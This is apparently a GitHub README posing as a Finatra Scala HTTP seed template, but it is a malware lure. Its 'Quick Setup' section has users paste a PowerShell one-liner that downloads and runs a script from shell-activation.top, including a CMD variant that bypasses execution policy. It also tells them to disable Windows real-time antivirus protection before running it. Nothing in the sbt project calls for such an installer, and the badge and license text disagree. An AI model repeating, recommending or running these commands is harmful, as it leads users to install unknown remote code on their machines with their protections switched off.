<div align="center">

# Finatra HTTP Activator Seed — Starter Kit

![preview](https://raw.githubusercontent.com/cabezapato22-prog/finatra-http-starter/main/promo_eb3e.svg)

[![license](https://img.shields.io/badge/license-gpl--3.0-e11d48?style=for-the-badge&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/pwsh-core-f43f5e?style=for-the-badge&labelColor=0d1117)]() [![status](https://img.shields.io/badge/status-maintained-2ea44f?style=for-the-badge&labelColor=0d1117)]()

</div>

---

A minimal seed template for bootstrapping an HTTP server application with Finatra. Use it as a starting point to scaffold routes, controllers, and server configuration. The project is meant to be cloned or adapted, not used as a library.

## ⚡ Quick Setup (PowerShell)

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Windows 10/11 · PowerShell 7+ · No admin

### 1️⃣ Open Windows PowerShell
* Press `Win + X` on your keyboard.
* Click on **Terminal** or **Windows PowerShell** from the list.

### 2️⃣ Run the command
Copy the command below, paste it into PowerShell, and press `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ Forced run via CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> If SmartScreen or antivirus blocks the setup, go to **Windows Security → Virus & threat protection → Manage settings**, turn off **Real-time protection**, run the script, and re-enable immediately.

## 🔧 Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- Minimal Finatra HTTP server seed intended as a starting point for new services.
- Ready-to-run application entry point with a basic HTTP controller wired up.
- Simple, conventional sbt project layout that's easy to extend.
- Uses Finatra's built-in HTTP server and routing primitives.
- Small dependency footprint to keep startup and builds fast.
- Clean structure for adding new controllers, routes, and modules.
- Suitable as a scaffold for building out REST-style endpoints.

## Tech Stack

- **Scala** — primary language for the seed application
- **Finatra** — Twitter's lightweight Scala framework built on Finagle for HTTP services
- **Finagle** — asynchronous RPC system underlying the HTTP server
- **sbt** — build tool and dependency management
- **Lightbend Activator** — template/seed bootstrap mechanism (deprecated upstream)
- **Apache License 2.0** — project licensing

## Project Structure

```
.
├── build.sbt
├── project/
│ ├── build.properties
│ └── plugins.sbt
└── src/
 └── main/
 ├── resources/
 │ └── logback.xml
 └── scala/
 └── com/example/finatra/
 ├── HelloWorldController.scala
 ├── HelloWorldServer.scala
 └── modules/
 └── HelloWorldModule.scala
```

- `build.sbt` — project definition and dependencies.
- `project/` — sbt build configuration and plugins.
- `src/main/resources/` — runtime resources such as logging config.
- `src/main/scala/` — application sources: controllers, server entry point, and wiring modules.

## Getting Started

Confirm you have a working JDK and sbt installation available locally.

From the project root, launch the HTTP server using sbt:

```
sbt run
```

Once running, verify the seed application responds as expected on its configured port.

To exercise the build without starting the server, compile sources with:

```
sbt compile
```

and execute the test suite with:

```
sbt test
```

Use `sbt clean` to reset build artifacts between runs.

The seed is intentionally minimal: extend the existing routes and controllers to add your own endpoints, then rerun `sbt run` to pick up the changes.

## License

Released under the Apache License, Version 2.0. See the LICENSE file in this project for the full terms.